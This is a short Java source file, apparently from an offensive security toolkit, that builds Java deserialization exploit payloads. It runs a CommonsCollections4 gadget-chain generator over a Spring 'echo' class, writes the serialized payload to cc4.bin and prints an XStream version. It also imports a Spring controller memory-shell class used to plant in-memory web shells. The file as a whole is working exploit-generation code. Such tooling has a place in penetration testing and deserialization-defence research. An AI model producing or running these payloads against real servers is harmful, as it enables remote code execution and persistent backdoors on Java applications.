package com.example.utils;

import com.example.echo.SpringEcho;
import com.example.memshell.SpringControllerMemShell;
import com.thoughtworks.xstream.XStream;
import org.ppp.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class PayloadMake {
    public static void main(String[] args) throws Exception{
        Class cls = SpringEcho.class;
        CC4Generator cc4Generator = new CC4Generator();
        String payload = cc4Generator.make(cls);
        System.out.println(payload.length());
        cc4Generator.makeFile(cls, "cc4.bin");

        System.out.println(cc4Generator.makeXStream(cls));
    }
}
